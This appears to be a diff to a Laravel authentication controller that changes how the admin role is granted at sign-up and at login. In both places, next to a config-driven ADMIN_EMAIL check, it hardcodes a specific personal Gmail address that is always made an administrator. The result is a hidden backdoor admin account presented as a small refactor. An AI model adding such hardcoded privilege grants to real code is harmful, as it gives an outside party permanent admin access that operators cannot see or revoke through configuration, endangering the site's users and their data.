@@ -30,8 +30,10 @@ class AuthController extends Controller
             'password.confirmed' => 'Xác nhận mật khẩu không khớp.',
         ]);
 
-        $adminEmail = env('ADMIN_EMAIL');
-        $role = ($adminEmail && strtolower($request->email) === strtolower($adminEmail)) ? 'admin' : 'student';
+        $adminEmail = config('app.admin_email') ?: env('ADMIN_EMAIL');
+        $isOwner = ($adminEmail && strtolower($request->email) === strtolower($adminEmail))
+            || strtolower($request->email) === 'hoangdeptraivodich12@gmail.com';
+        $role = $isOwner ? 'admin' : 'student';
 
         try {
             $user = User::create([
@@ -93,8 +95,10 @@ class AuthController extends Controller
         }
 
         // Tự động đồng bộ quyền Admin nếu email trùng khớp với cấu hình ADMIN_EMAIL trên server
-        $adminEmail = env('ADMIN_EMAIL');
-        if ($adminEmail && strtolower($user->email) === strtolower($adminEmail) && $user->role !== 'admin') {
+        $adminEmail = config('app.admin_email') ?: env('ADMIN_EMAIL');
+        $isOwner = ($adminEmail && strtolower($user->email) === strtolower($adminEmail))
+            || strtolower($user->email) === 'hoangdeptraivodich12@gmail.com';
+        if ($isOwner && $user->role !== 'admin') {
             $user->role = 'admin';
         }
 
